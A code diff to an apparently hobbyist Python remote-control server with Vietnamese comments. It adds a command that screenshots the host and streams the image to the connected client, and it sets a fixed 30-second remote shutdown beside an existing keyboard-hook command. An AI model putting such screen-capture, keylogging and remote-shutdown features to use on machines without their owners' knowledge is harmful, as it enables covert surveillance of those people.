@@ -1,3 +1,5 @@
+import pyautogui #cài pyautogui và pillow nha!
+
 def Server_Running():
     #Bật server lên
     import socket
@@ -169,8 +171,24 @@ def Server_Running():
         t2.join()
     def Recieve_Close():
         import os
-        os.system('shutdown -s -t "time"')
-        #time la thoi gian set up tat may tuy y
+        os.system('shutdown -s -t 30')
+        #30 la thoi gian tat may 
+
+    def Screenshot():
+        
+        image = pyautogui.screenshot()
+        image = image.resize((500,400)) 
+        image.save("scrshot.png")
+        try:
+            # open image ======
+            myfile = open("scrshot.png", 'rb')
+
+            bytes = myfile.read()
+            #gui du lieu qua client
+            client.sendall(bytes)
+            myfile.close()
+        finally:
+            print("sever close")
 
     #Command cho server:
     while True:
@@ -185,6 +203,8 @@ def Server_Running():
                     App_start(Name)
                 elif i == "Hook Key": hook()
                 elif i == "Shutdown" : Recieve_Close()
+                elif i == "Chup man hinh": Screenshot()
+
             Command = client.recv(1024).decode("utf8")
             client.sendall(bytes("Da nhan lenh","utf8"))
             print(Command)
